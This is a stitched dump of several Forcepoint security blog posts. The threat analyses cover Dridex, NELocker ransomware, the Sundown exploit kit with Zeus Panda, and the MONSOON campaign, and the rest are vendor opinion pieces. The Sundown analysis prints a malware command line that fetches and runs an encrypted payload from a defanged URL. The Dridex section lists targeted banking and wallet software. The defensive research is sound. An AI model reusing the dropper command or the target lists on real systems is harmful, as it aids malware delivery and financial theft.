values.\n\nOther element types contain XOR encrypted strings with the string length and XOR key also defined in the content. For example, the element type 1 (\"httpshots\") has the following content structure:\n\n\ntype         (BYTE)             - the type of \"httpshot\" which can be 0 (deny) or 1 (allow)\nonget        (BYTE)             - defines if data should be captured from GET requests to this URL (0 or 1)\nonpost       (BYTE)             - defines if data should be captured from POST requests to this URL (0 or 1)\npattern      (variable length)  - a structure containing an encrypted URL regex pattern string to match on\n\nThe \"pattern\" entry is a binary structure containing an encrypted string. The structure for every string begins with a WORD value defining the length of the string, followed by a 4-byte XOR key, and finally the encrypted string content:\n\n\nlength       (WORD)             - defines the length of the encrypted string\nxorkey       (BYTE[4])          - defines the 4-byte XOR encryption key for the string\nstring       (variable length)  - the encrypted string\n\nIn March, 2016 Moritz Kroll created a Python script to reconstruct the configuration from the raw, encrypted stream by parsing these elements. Newer versions of Dridex contain an additional parameter for the \"redirects\" element which appears to be a default URL.\n\nTargeted software & cryptocurrency wallets\n\nDridex contains two distinct lists for targeting software that is installed on the current system. These lists have gradually expanded over the months and years, and now include back-end payment and point-of-sale software, online banking software, and a recently added list of crypto-currency wallet managers.\n\nA full list of targeted software used by Dridex botnet 1234 can be seen below, captured on September 2, 2016 from version 3.247 of the worker module:\n\n\n<commands>\n    <cmd id=\"5648\" type=\"15\">\n        <fs>avaloq</fs>\n    </cmd>\n    <cmd id=\"5649\" type=\"15\">\n        <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>\n    </cmd>\n    <cmd id=\"5819\" type=\"17\">\n        <kl>WinBacs,albacs,Albany.EFT.Corporate.Client,wpc,eSigner,StartStarMoney,StarMoney,acsagent,accrdsub,acevents,acCOMpkcs,jp2launcher,sllauncher,cspregtool,RegisterTool,OEBMCC32,sfirm,Bbm24win,wip,paypen,mammut_tb,telelink,translink,deltaworks,dfsvc,bitcoin-qt,multibit,BacscomIP2,runclient,paycentre,accesspay,PaymentStudio,DiasClient,SynIntegrationClient,QuestLauncher,RemoteAdminServer,SymForm2App,plink,launch,PaygateWpfClient,terminal,Telelink,EBsec,ftrskr,Suite Entreprise,rbpmain2,rbpmain,tkc,ecbl-nxbp,sagedirect,turbo_teletransmission,cedripack,cedrisend,QikDesktop,QikDesktopCitrix,ConfigurationEditor,InteractFastConfig,otscm-client,ecb-sg,crs1,GbpSV,pstw32,MopaMaes,ldcptv10,gslshmsrvc,launcher,tokensharesrv,universe,ifrun60,roiwin31,guawin32,intwin31,kb_pcb,spawin31,cziwin31,czawin31,sta2gpc,etsr,tellerlauncher,prowin32,dirclt32,PLT1751,PLT1151,cegidebics,CCS3,CCMPS3,ComSX,keepass,c_agent,transac,relaisbtp,telebanking,ewallet,mstsc,cardentry,TPComplianceManager,TPWorkstation,BancLine 2.0,MS000000,BancLine 3.0,BancLine 4.0,BancLine 5.0,SFW,ptw1151,fedcomp,sfmain,VRNetWorld,KDS,Kasir,ICS,mpkds,pspooler,ipspool,POS-CFG,callerIdserver,EftTray,dpseftxc,EFTSERV,QBPOS,APRINT6,POSCONFG,jRestaurant,AFR38,rmpos,roi,AxUpdatePortal,Firefly,InitEpp,SM22,xfsExplorer,XFSSimulator,WosaXFSTest,kiosk,CRE2004,aspnet_wp,javav,XChrgSrv,rpccEngine,PTService,Rpro8,UTG2Svc,Active-Charge,javaw,DDCDSRV1,alohaedc,dbstpssvc,XPS,Transnet,posw,NCRLoader,PSTTransfer,TSTSolutions,wndaudit,TSTAdmin,TellerDR,merapplauncher,contact manager,goldtllr32,goldtrakpc,farm42phyton,fx4cash,bpcssm,vp-ebanking,LLB Online Banking,efix,iberclear,AMBCN,SGO,SQLpnr,vmware-view,banktelapk,SynJhaIntService,uniservice,client32,CanaraCustMaintenance,legaclt,pcsfe,pcscmenu,cwbtf,srvview,pcsmc2vb,cwb3uic,trcgui,cwbsvstr,rtopcb,cwbujcnv,cwbujbld,cwbuisxe,pcsws,cwbsvd,cwblog,cwbdsk,securID,jhaintexec,appupdate,SGNavigatorApp,dbr,WINTRV,bsaadmin,encompass,eautomate,link,adminconsole,commandclientplugin,commandclientplugin_gui,mfmanager,verex director-server manager,verex director-communication manager,notes,nlnotes,notes2,sacmonitor,netterm,fspnet,bridgerinside,cardserver,si,dais.ebank.client.offlineclient,BGFWIN31,BGDWIN31,BGXWIN31,bocusertool,CLXReader,UBSPay,Migros_Bank_E-Banking,Bank linth Online Banking,java,abastart,abamenu,abajvm,sage200.finanz.gui,vpxclient,htmlshell,mmc,e3K.Main,QOPT,cresus,wineur,abaeb,efinance,GestionPE,BCN-Netkey,Sage 30,ISL_light_client,msaccess,proffix.v4,pxShowThread,grpwise,mammut private,CashCommv5,winbiz</kl>\n    </cmd>\n</commands>\n\nThe \"fs\" list specifies a list of strings to search on the file-system. Any directory paths matching a string will be reported to a peer node in the format \"matched-string|full-path\", such as \"electrum|C:\\Program Files\\Electrum\". This allows the Dridex operators to quickly and effectively profile a system for interesting software that could be targeted for financial gain.\n\nThe \"kl\" list specifies a list of process names to find and inject into, in order to perform key-logging activities. The key logs are then sent to a peer node periodically as a \"keylog session\" with the associated process name.\n\nProtection statement\n\nForcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n	Stage 5 (Dropper File) - The malware is prevented from being downloaded from malicious URLs.\n	Stage 6 (Call Home) - Dridex is blocked from communicating with its loader C&Cs.\nSummary\n\nDespite the slow down in Dridex activity, there is no reason to believe that the threat is going to disappear. The malware is still being developed and improved, consistently striving to be harder to detect and protect against. The delivery of Dridex remains much the same, with the most common delivery being by e-mail. It is important to remain cautious and vigilant when opening e-mails containing attachments or links, and to ensure that Microsoft Office macros are disabled whenever possible.  We continue to closely collaborate with our colleagues in CERT-UK as well as other national bodies, in order to assist with the ongoing efforts to combat threats such as these.\n\nIndicators of Compromise\n\nDridex Samples (SHA1)\n\n\n606236dcce09a75aecb64daddaec7d247900a10d\nf88d05e5cca62a332fe4267db100086c7bde6379\n\nDridex Loader C&Cs\n\n\n210.172.213.117:18443\n87.98.132.57:18443\n37.221.210.196:4434\n85.214.207.16:18443', 'https://www.forcepoint.com/blog/security-labs/dridex-shadows-blacklisting-stealth-and-crypto-currency\n');

Just look at the 1,000 or so vendors/researchers/consortiums who were present at RSA and Black Hat in 2016, and you can understand how difficult it can be to stay current on security technologies and practices. In a series of five blogs, I’d like to pause a minute and reflect on some of the advances in information security technologies that have significantly improved the ability of companies to defend against attacks and data loss. These capabilities, that today are readily available, I really wanted 10 years ago. Each one has their own angle on improving security preparedness, and each one has made the life of CISOs a little more bearable. I’ll begin with #5 and over this blog series will work my way to the #1 security capability on my wish list 10 years ago.\n\n\n	#5 – I wanted web security that was more than URL filtering, and wanted that protection for laptops off the corporate network.\n\n\n	Ten years ago, web security was largely defined as URL filtering, and it was just that. Companies like Websense and Blue Coat would scour the web indexing and categorizing web sites. Companies could buy an appliance to block internal users from accessing known malicious or inappropriate web sites or categories of web sites. The two primary issues I had with the technology was (a) the technology wasn’t 100 percent accurate and sometimes legitimate business sites were blocked (I remember a case where Yahoo! was mistakenly blocked and we had C-level executives calling us within minutes); and (b) it was all or nothing.  Either the site was blocked at the URL level or not at all.\n\n\n	Fast forward to today and web security has evolved to far more than simple URL filtering. Web security gateways have much more intelligence built-in and the capabilities and granularity of control is significantly improved. Sure, companies can still block access to individual sites or categories of web sites, but now the CONTENT of the web page is analyzed on-the-fly and is based on reputation analysis, real-time content scanning, code scanning, behavior analysis and other factors; access and content is allowed or blocked based on the results of those factors. So companies can block whole pages or sections of pages based on what type of content is being served up and the reputation of the site owner. Add to that, some truly integrated add-on capabilities such as malware detection both inbound and outbound, web application analysis and control (discover and risk-rate cloud apps your employees may be using such as Dropbox, Office365 or Salesforce), data loss prevention capabilities and the ability to examine encrypted sessions via HTTPS inspection. In addition to PC-based anti-malware, web and email gateways can also detect malicious activity leaving your network, so malware that successfully penetrates defenses to get into your environment (and may go un-noticed) can’t communicate with command and control servers out on the internet.\n\n\n	To top it all off, some of the true market leaders allow companies to provide these capabilities on-premise, completely in the cloud (no on-premise equipment) or in a hybrid model of both – all while managing these capabilities out of a single management console. Thus, mobile users who are surfing the web from home, from Starbucks or from a strip mall parking lot are protected as if they were sitting in the office. To simplify deployment and reduce user impact, these protections can even be deployed without modifying proxy settings so truly mobile users don’t have to worry about losing protections as they travel from one environment to another.\n\n\n	Even though web security came in at #5, don’t think it’s any less important than the others. Web security capabilities available today dwarf the capabilities in 2006, and truly make protecting an organization from cyber threats easier. Please keep an eye out for the rest of this series where I explore the remainder of my Top Five list from 2006.\n\n\n	 \n\n\n	To learn more about a technology that delivers these security capabilities, visit: https://www.forcepoint.com/solutions/need/unified-content-security', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-4\n');

When you buy homeowners insurance, do you think about the potential for a house fire or flood? You probably don’t spend much time contemplating crashes or fires. Of course you know there is a chance these things may happen, even though it’s likely a small one. Why buy insurance otherwise?  However, the consequence of either of any of these happening can be significant. Rebuilding a house, buying new clothes, electronics and appliances, is very expensive. Buying insurance is rational, and in some instances, it’s even required. The bottom line: if something has a high chance of occurring resulting in a costly impact, it correctly gets first priority. However, even if something has a lower chance of occurring (i.e., a breach) it should get similar attention when the impact is equally detrimental.\n\n\n	Recently I read an announcement from a medical provider about a data breach they’d suffered, and one sentence particularly stood out:\n\n\n	“In the ten years of having electronic medical records this [a data breach] had never happened.” \n\n\n	They then spoke about the numerous steps they are now taking in the wake of this breach to enhance their cybersecurity, including the purchase of cybersecurity equipment. Prior to the breach the assumption appeared to be that because they hadn’t yet experienced a breach they were either 1) doing the right thing or 2) were not a target (and therefore would continue not to be).\n\n\n	Clearly neither of these assumptions proved correct since following the breach they realized they needed to take multiple actions. Perhaps they only thought of big companies or government agencies as targets and that they were too small or unimportant to be singled out. Let me state unequivocally: If you connect anything (PC, TV set, car, thermostat, baby monitor, toaster, mobile phone, etc.) to the Internet, you are a target. Every company, no matter the size or the industry, is a potential to be a target to the right criminal.\n\n\n	Just like auto or homeowner’s insurance, don’t assume cybersecurity is unnecessary because you haven’t yet had to rely on it.  Cybersecurity is a continual. Don’t wait for a breach to happen to find that out.', 'https://www.forcepoint.com/blog/insights/forcepoint-flash-office-cso-3\n');

This physical network and data separation has long been a security best practice for US and International government agencies that are charged with protecting some of the most sensitive data.\n\n\n	As noted by Forcepoint’s Principal Security Analyst Carl Leonard in his blog comparing this year\'s Black Hat to last, the commercial sector – particularly Finance and Healthcare – are also starting to evaluate this best practice to help protect their sensitive information and networks.\n\n\n	With the increase in attacks on government agencies and commercial entities from rogue actors and nation states alike, no longer are strict security practices the realm of intelligence and defense communities. Our global economies and security apparatus are interconnected and deserve – or more accurately, require – the highest degree of protection available. In a presentation at our Black Hat booth, Forcepoint Sales Engineer Randy Hill shared his thoughts on how the private sector can apply this security best practice.\n\n\n	Moving away from flat, interconnected networks first requires identifying where the most sensitive networks/data reside, using it as a guide to physically separate networks from each other. The most critical networks should be far and away from less restrictive access points.\n\n\n	But separating networks is only the first step. User access must also be segmented by roles and responsibilities. However, a recent Forcepoint™ and Ponemon Institute survey revealed a majority of commercial and federal IT operations and security managers believe that user access often extends beyond what’s needed. 70 percent of both groups surveyed thought it “very likely” or “likely” that privileged users believe they are empowered to access all the information they can view. Increasingly, malicious insiders target privileged users to obtain their access rights, so it\'s no surprise then that those surveyed also expect insider threats to continue to remain an issue. This is especially concerning as damage caused by hijacked privileged user credentials is the most extensive, the hardest to mitigate and the most difficult to detect.\n\n\n	Thankfully, security technologies and best practice techniques like Network Segmentation and user access rights ensure that even if the attacker gets through the front door, they can’t get very far easily.\n\n\n	For more information on Network Segmentation as a best practice, read our whitepaper Safeguarding Organizations through Network Segmentation.

In a presentation entitled Inside Out – Viewing Everyone and Everything as Potential Insider Threats,  Dr. Ford noted that part of the challenge of addressing the insider threat may be in the terminology itself.  Words influence the way we think. The terminology “insider threat” suggests that organizations can’t trust their employees when in fact the aim is to protect them.  \n\n\n	Dr. Ford suggested consistently using three distinct categories when assigning an insider threat; these are:\n\n\n		Accidental Insider: Employees who inadvertently cause harm by clicking on a link or downloading items they believe to be legitimate.\n	\n		Reckless Insider:  Employees who actively ignore or bypass, without malicious intent, directives from IT on the safe or acceptable use of corporate technology and outside applications.\n	\n		Malicious Insider: Employees who intentionally misuse access to confidential intellectual property or company systems for the purpose of theft, sabotage or fraud.\n\n	While malicious insiders might more often make the news, they’re not primarily driving the rise in breaches. That’s because while users press the keys, it’s programs that carry out the actions, meaning  everything running within a system is a potential insider threat.\n\n\n	Jim Fulton, senior director of Forcepoint marketing, addressed the changing view of the “insider” with visitors to the Forcepoint booth at Black Hat.\n\n\n	“People are beginning to see that this notion of the “insider” isn’t the rogue employee, but is actually anything inside the network, including programs. In fact, if you look at insiders as being anything operating in your network, that greatly simplifies things,” said Fulton.\n\n\n	Fulton also emphasized that what started with the best of intentions - providing defense in depth - has begun to spiral out of control.  Adding a separate solution every time attackers change their methods is no longer feasible. A unified approach that addresses a much larger number of attacks while stopping the flood of point products allows organizations to zero in on protecting the thing that really matters, critical data.\n\n\n	Check out the links below for more information on unified content security.\n\n\n		The Need for Unified Content Security, part one in a 3-part drip white paper series on unified content security.\n	\n		Why Unified Security Solutions Are a Necessity.

It appears to have started in December 2015 and is still ongoing as of July 2016. The malware components used in MONSOON are typically distributed through weaponised documents sent through e-mail to specifically chosen targets. Themes of these documents are usually political in nature and taken from recent publications on topical current affairs.\n\n\n	Several Sophisticated Malware Components\n\n\n	MONSOON includes the use of multiple malware families, including Unknown Logger Public, TINYTYPHON, BADNEWS, and an AutoIt backdoor. BADNEWS is particularly interesting, containing resilient command-and-control (C&C) capability using RSS feeds, Github, forums, blogs and Dynamic DNS hosts. Malware used in MONSOON contains the ability to bypass Windows User Account Control and evade modern anti-malware solutions.\n\n\n	Who Is Behind MONSOON?\n\n\n	Amongst the evidence gathered during the MONSOON investigation were a number of indicators which make it highly probable that this adversary and the Operation Hangover adversary are one and the same and are operating out of the Indian Sub Continent.\n\n\n	How And When Did We Do The Research?\n\n\n	Our investigation into MONSOON began in May 2016. Over the course of our investigation we discovered over 170 malicious documents and 4 distinct malware families.\n\n\n	Download Links\n\n\n	Our deep-dive technical analysis is available for download now from https://www.forcepoint.com/resources/datasheets/monsoon-analysis-apt-campaign', 'https://www.forcepoint.com/blog/security-labs/monsoon-analysis-apt-campaign\n');

Our Trusted Thin Client is one example of such technology.\n\n\n	At last year’s Black Hat presenters demonstrated cars could be hacked. This year we saw that  Chip and PIN  technology – now a commonplace security feature for debit and credit cards - is not immune from vulnerabilities. Were you surprised?\n\n\n	We actually anticipated in our 2014 Cybersecurity Predictions Report that as the financial services and retail industries escalated their defenses with security measures such as Chip and PIN technology that the manner in which these thefts were committed would morph. So it’s not surprising – to us anyway.\n\n\n	Any other observations from the show you’d like to share?\n\n\n	I spoke with more information security executives from the financial services industry and government space than in previous years. Both face a steady stream of complex threats, so it’s not unexpected they’d want to counter them with the latest in leading edge innovations.  They’re often a bell weather for what the next wave of security technology adoption will be.\n\n\n	We’ll be updating this space with more from our Black Hat experience.

That evening, Forcepoint’s hosted its CISO panel and dinner, continuing these important conversations.\n\n\n	We spoke to Steven Fox, a senior cyber security officer with a large federal agency, to get his take on the CISO Summit.  In our discussion, he mentioned three major areas that received attention: the speed of cyber security; contextualizing threat intelligence; and cyber insurance. Making cyber security more responsive to the rapid pace of business requires that the CISO be both storyteller and change agent in order to introduce initiatives to make security make sense for business needs. Making sense of data and being able to quickly normalize it to the environment at hand – or determine if it’s out of place – is equally important to rapid response. Lastly, the prevalence of ransomware appears to be affecting the growth and prevalence of cyber insurance with raising questions like whether coverage should be expanded to include ransomware payments, though there exists concern that organizations may use such coverage as excuse not to secure their environments.\n\n\n	Forcepoint’s CISO panel discussion at Black Hat began with each person sharing what they look forward to most about Black Hat with participants noting that it’s always great to see old colleagues, and to be around such talented, intelligent people that are so good at what they do. Most importantly, it’s invigorating to see that ultimately, those of us in cyber security all have the same goal: to secure the organizations for which we work and design solutions.\n\n\n	While it was mentioned that as cyber security professionals, we like to think about and prepare for the “sexy” stuff, like nation-state sponsored attacks, we need to take it back to basics: what data is leaving the organization, what’s coming in, and what behaviors are anomalous.\n\n\n	Another key discussion focused around the challenge of selling security internally. A few customers mentioned that unfortunately, more often than not, making budget available for security solutions isn\'t deemed as important without an incident. But tying revenue to risk resonates with the c-suite and board or as noted by Forcepoint Chief Information Security Officer Dave Barton, “If you can quantify the loss of revenue with regard to a specific risk, then getting funding is easier.\"\n\n\n	Overall, participants agreed that CISOs role must evolve to meet the evolving needs of organizations. One panelists pointed out that as CISOs there’s room to mature, or per Dave Barton, “At the end of the day, the goal of most security organizations is to mature their program. What\'s clear with all of the malware, ransomware, etc. is that we all have room to mature.”\n\n\n	Dinner discussion followed the panel, and though it started with a laundry list of questions, one clearly resonated, spawning a 45 minute discussion: What does the insider threat mean to you and how does it impact your organization?  There were mentions of European concerns around privacy and monitoring, building an insider threat program in line with local/countrywide legislation around employee data, and gaining insight into the behavior of employees while still being able to gain attribution if necessary.\n\n\n	Insider threat and risk management processes come with funding requirements, so discussion on how to show a return on investment and move to more speaking the language of business and risk mitigation, instead of cyber security, is important to getting executives and board members to understand its importance. While training and technology are both necessary to an insider threat program, executive support makes the difference.\n\n\n	We’ll be updating this space with our take on these and a myriad of other discussions at Black Hat.

Recently the actor has begun dropping legitimate command line utilities like 7Zip and PHP onto infected systems to perform the encryption. The malicious use of these benign tools makes this an effective and tricky-to-detect threat. We have dubbed this ransomware \"NELocker\".\n\n\n	E-mail Lures\n\n\n	The actor distributes their malware by e-mail. A recent e-mail campaign posed as a confusing courier e-mail.\n\n\n	\n\n\n	A ZIP file is attached here, which contains a malicious Javascript (JS) file. We can see the \".js\" file extension when we turn off the Windows feature to hide extensions for known file types.\n\n\n	\n\n\n	When this file is double clicked or otherwise executed, it will begin to download malware onto the machine. This kind of JS file is often referred to as \"Nemucod\", which is a broad anti-virus name given to a wide variety of malicious JS downloaders.\n\n\n	Nemucod JS Downloader\n\n\n	The Nemucod JS file is obfuscated, but once unpacked it becomes a lot clearer to analyse. The common behaviour among this actor\'s JS downloaders is to grab two EXEs and execute them, which are usually named a1.exe and a2.exe.\n\n\n	\n\n\n	Typically these two malware components are the Kovter and Miuref malware families, but this actor sometimes changes or downloads additional malware components. For example, in January we blogged about this actor distributing PGDownloader to turn machines into zombies. \n\n\n	NELocker Template\n\n\n	Since March 2016 code was added to download additional components and to use these components for ransomware purposes. The components used for encrypting files varies; recently we have seen both the 7Zip and PHP command line utilities being used for encryption.\n\n\n	All variants of these JS files now contain the same template ransom message which will be shown to an infected user once their files are encrypted.

A copy of the password is then sent to the same command-and-control (C&C) server that the malware was downloaded from.\n\n\n	\n\n\n	More recently we have seen a PHP file and a legitimate PHP command line utility being downloaded. In this variant NELocker invokes the PHP command line utility in order to execute the PHP file, which is heavily obfuscated.\n\n\n	\n\n\n	After deobfuscation the PHP file is easy to understand. It iterates through drive letters C to Z and performs XOR encryption on eligible files using a hard-coded encryption key which is base64-encoded.\n\n\n	\n\n\n	The Emsisosft Decrypter for Nemucod is able to brute force the encryption key for any files encrypted in this manner.\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.\n	\n		Stage 5 (Dropper) - The malware is prevented from being downloaded from the malicious URLs.\n\n	Summary\n\n\n	The adoption of ransomware shows no signs of slowing down. The development of NELocker demonstrates the ease and effectiveness by which ransomware can be created by abusing legitimate software like 7Zip and PHP.

Upon further investigation we discovered that the banking trojan was a new version of Zeus Panda. This malware has previously been delivered by the Angler, Nuclear and Neutrino EKs.\n\n\n	Sundown EK Landing Page\n\n\n	The Sundown EK landing page obfuscation has undergone several evolutions recently, indicating that the developer is highly active. An example of the landing page from July 25, 2016 was as below.\n\n\n	\n\n\n	The exploits used by Sundown are dynamically written onto the page from the base64-encoded content on the landing page.\n\n\n	Sundown EK Exploits\n\n\n	While Sundown does not have the maturity and infrastructure of other EKs yet, its implementation of modern exploits makes it a dangerous threat. We are currently aware of three vectors that Sundown uses for exploiting a browser and executing malware:\n\n\n		Adobe Flash Player exploits (CVE-2015-0313 & CVE-2015-0311)\n	\n		Microsoft Silverlight exploit (CVE-2016-0034)\n	\n		Internet Explorer (IE) exploits (CVE-2015-2419 & CVE-2016-0189)\n\n	All of these exploits attempt to execute shellcode which will download and execute a payload from another Sundown EK URL. The only significant difference between the exploit payload deliveries is that the IE exploits receive an RC4-encrypted version of the malware from \"y.php\" whereas the Flash and Silverlight exploits receive an unencrypted version of the malware from \"z.php\".\n\n\n	When we analysed the shellcode used in the IE CVE-2015-2419 exploit we observed cmd.exe being invoked with a command line to save a file to disk under \"%tmp%\\r3ak.tmp\" and then execute the script with some parameters.\n\n\n	\n\n\n	The script written to r3ak.tmp is a JScript which will download a payload from a URL provided, using a specified user-agent string. It will then RC4 decrypt the payload using a key given in the parameters and will finally execute the payload as an exe file.\n\n\n	In this example the script downloads the encrypted payload from \"hxxp://ytbuybytvtrcevrtbyybyttvrcrvbyynubyvrvgh[.]xyz/y.php?id=67\" and decrypts it using the key \"gexywoaxor\". The following command line is used to invoke the script which does this:\n\n\nwscript /B /E:JScript r3ak.tmp \"gexywoaxor\" \"hxxp://ytbuybytvtrcevrtbyybyttvrcrvbyynubyvrvgh[.]xyz/y.php?id=67\" \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727)\"\n\n\n	Zeus Panda Malware\n\n\n	Last week we noticed that Sundown was distributing the Panda banking trojan. This is an improved variant of the Zeus (Zbot) banking trojan, containing JSON and base64-encoded configurations and modules. We have blogged about Zeus variants in the past:\n\n\n		Crimeware Based Targeted Attacks: Citadel Case, Part III\n	\n		Zeus PIF - The Evolving Strain Looking To Defeat Your Security Software\n\n	Configuration\n\n\n	Zeus Panda\'s main configuration is downloaded from its command-and-control (C&C) and contains information regarding the associated botnet ID and additional modules to download.\n\n\n	\n\n\n	Zeus\'s main capabilities include:\n\n\n		Credential theft from various software such as browsers and FTP clients.\n	\n		Browser infection to steal banking traffic, take screenshots, and modify pages (man-in-the-browser).\n	\n		Remote desktop via VNC.\n\n	Browser Infection\n\n\n	The malware will download typical Zeus \"webinjects\" which will allow browser pages to be modified.\n\n\n	\n\n\n	These injections are used for modifying banking login pages in order to prompt a user for additional login details. This is done by the malware inserting itself into browsers (i.e. IE, Chrome, or Firefox) and modifying the content it receives from banking sites. This is known as a man-in-the-browser (MITB) attack, where the banking websites themselves are not infected but the user\'s browser is.\n\n\n	The details collected from these injections are then sent to the attacker\'s C&C where they will be used to login and steal money from a user\'s account.\n\n\n	Automated Transfer Scripts\n\n\n	The Zeus Panda sample we analysed (SHA1 ccf17e27c0e5883920bb6abea5bc5d6c2c7a1c37) used automated transfer scripts (ATS) from \"hxxps://alvijob[.]website/\" to inject code into banking websites. ATS are essentially javascript files which are hosted on a third party website, and contain code which will change the content of a banking website. These javascript files can be updated without having to push a new configuration update to the malware.\n\n\n	The following example shows an ATS injection modifying a banking login page to prompt for card reader information. This information is not usually required for a normal login, and will instead be stolen by the malware.\n\n\n	\n\n\n	The author of the ATS web injections also appears to be working on targeting Australian banking websites, but as of yet there is only one injection which simply displays an alert if the site is visited:\n\n\n	\n\n\n	Zeus Panda attempts to defraud customers of the following financial institutions:\n\n\n		Barclays\n	\n		Lloyds Bank\n	\n		NatWest\n	\n		RBS\n	\n		Halifax\n	\n		Bank of Scotland\n	\n		HSBC\n	\n		Santander\n	\n		Nationwide\n	\n		Metro Bank\n	\n		Co-operative Bank\n	\n		cahoot\n	\n		Intelligent Finance\n	\n		PayPal\n	\n		eBay\n\n	Debug Log\n\n\n	The Zeus Panda build we analysed had its debug output enabled so we were able to gain some insight into what it was doing at each stage of infection.\n\n\n	\n\n\n	The names of some of the classes used in the source code are visible in the debug log, including previously known Zeus classes like \"DynamicConfig\". We can also see the Zeus Panda build version number here, which is \"2.2.5\".\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n		Stage 4 (Exploit Kit) - The Sundown EK sites are detected and blocked.\n	\n		Stage 5 (Dropper File) - The Zeus Panda malware files are detected.\n\n	Summary\n\n\n	The Zeus banking trojan was first identified in 2007 and its source code was leaked in 2011. Since 2011 there have been many spin-offs of Zeus, and evidently it still remains a popular choice for criminals. It is important to keep browser plug-ins such as Adobe Flash Player and Microsoft Silverlight up to date.

Though organizations often struggle to adapt to these challenges, the technologies available today, such as cloud computing, mobile computing and the internet of things, offer business opportunities and capabilities that never existed before. Those organizations that can effectively adapt and securely leverage the transformative technologies of 2016 will thrive and define the new business models for the future.\n\n\n	The threat landscape of 2016 is vastly different than it was even a few years ago, and is rapidly evolving. The threat actors of 2016 can introduce significantly more risk than those that preceded them. The threat actors today include nation states, highly sophisticated, mature criminal organizations, opportunists hired to infiltrate organizations for financial or political gain, and groups that attack based solely on ideological differences. To safely enable businesses to rapidly adapt and advance, information security departments and information security solution providers must provide protections that are comprehensive, integrated and adaptive to both the needs of the business and the evolving threat landscape.\n\n\n		\n			Comprehensive – No longer can organizations consider themselves fully protected with a firewall and endpoint anti-malware software. Threats can come in the form of malicious links, infected file attachments, “drive-by” downloads, malicious web pages, etc. and the entry point can be via email, internet web pages, the company’s own web pages, applications and even their own employees or third party contractors. Security protections need to provide a wide range of capabilities to address an organization’s threats and vulnerabilities. Capabilities such as email attachment sandboxing, URL sandboxing, click-time web protection, web URL and DNS filtering, web page content inspection, https inspection, web application discovery, data discovery, data loss prevention, phishing protection, phishing exercise capabilities and more. These capabilities are in addition to the more “traditional” security protections such as stateful firewalls, intrusion detection and prevention, endpoint anti-malware and strong processes and practices around access control. Without comprehensive protections in place, gaps that can generate substantial risk may exist within or outside your organization. This could be similar to locking your house, closing your garage door, closing and locking all the windows, but leaving your car outside the garage unlocked, which has a garage door opener or spare key in it. These gaps may be easy to find at home, but in a complex business environment spanning multiple business functions, networks, locations and countries, this can be extremely difficult. Organizations are challenged with identifying and remediating these gaps before criminals can exploit them.\n	\n	\n		\n			Integrated – Depending on the industry and the culture of the organization, dedicated security resources within a company can range in quantity from less than one to several hundred. Although CISOs and CROs fully understand ALL risks shouldn’t be mitigated, nearly every CIO and CISO I speak with feels security resources (staff, budget) are constrained to the point that they are challenged to even mitigate those risks that the organization wants addressed. To help organizations address some of their resource constraints, it’s important to leverage security tools that are integrated. Integrated security tools leverage the same security intelligence platform, the same threat protection engine and can be managed from the same console or “single pane of glass.”\n\n		\n				\n					Intelligence and threat protection – tools that leverage a common intelligence platform benefit from the collective wisdom of all the tools and intelligence feeds. That is to say, when a new threat is identified by one tool, all tools benefit from that discovery. This raises the intelligence of not only that tool, but ALL the integrated tools. A good analogy I’ve heard used is “all boats rise in high tide.”\n			\n			\n				\n					Integrated console – security teams with tools that leverage a common, integrated management console benefit from reduced staff hours required to manage the tools.  Not only does it reduce “point product fatigue” in having to manage many tools independently, but a common management console, or command center, can provide a prioritized risk view across the tool set that can make security staff more efficient at addressing the most critical risks across the organization, while not wasting time on insignificant ones.\n			\n		\n	\n		\n			Adaptive – As described earlier, organizations are constantly adapting to the evolving business and threat landscape, and they need security protections that can adapt as well. Whether a company decides to implement protections in their data center, on their PCs or in the cloud, they don’t want separate tools for separate environments. Organizations comfortable with their security platforms want to use the same protections in the cloud as they use in their own data center. When the business drives functionality to the cloud, introducing new security tools to manage the cloud application or platform just puts more demands on an already resource-constrained team. Adaptive security platforms abstract the information security protections from the location or platform of the information, and in the best scenario, allow teams to manage those same protections across locations, platforms and applications from within the same integrated command center.\n	\n\n	Today’s evolving business landscape is providing organizations tremendous, transformative opportunities for advancement, yet at the same time forcing them to adapt to new technologies at an aggressive and challenging pace.  That rapid change can wreak havoc with security teams that are resource constrained.  Existing protections must be managed, new initiatives need to be evaluated and protected, and the same staff is charged with increased responsibilities. Equipped not with point solutions, but with security platforms that are comprehensive, integrated and adaptive, security teams are positioned to better keep pace and maintain effective security controls for their organizations.\n\n\n	Doug Copley is Deputy CISO and Security and Privacy Strategist with Forcepoint.

Initially considered just a consumer threat, both government and commercial enterprise networks can now be listed among its victims.  A new report from Forcepoint Security Labs examines the technical and business threats that ransomware continues to pose to organizations for which IT security teams must be prepared to address and overcome.\n\n\n	In February I looked into the specifics of ransomware affecting the healthcare sector.  We know of course that ransomware can be disruptive for any business.  Why?  The common theme is the value of and importance of having ready access to your data, often taken away by an onset of ransomware in your environment. Organizations typically have a good grasp on the “confidentiality” and “integrity” aspects of their mission critical data, but many haven’t given the “availability” aspect enough emphasis.  Ransomware attacks have pressed companies to acknowledge how time-sensitive and how critical information availability is. It’s also forced organizations to question their backup practices. Some have realized their backup strategies can’t restore in the time necessary to avoid significant business disruption. Even if they could restore the data, they pay the ransom to hopefully restore it more quickly than they might be able to themselves.\n\n\n	Unlike with data theft, ransomware is easy to monetize.  It would be very easy for ransomware criminals to exfiltrate data. However, to monetize stolen data they need to conduct identity theft activities or find a third party buyer willing to pay 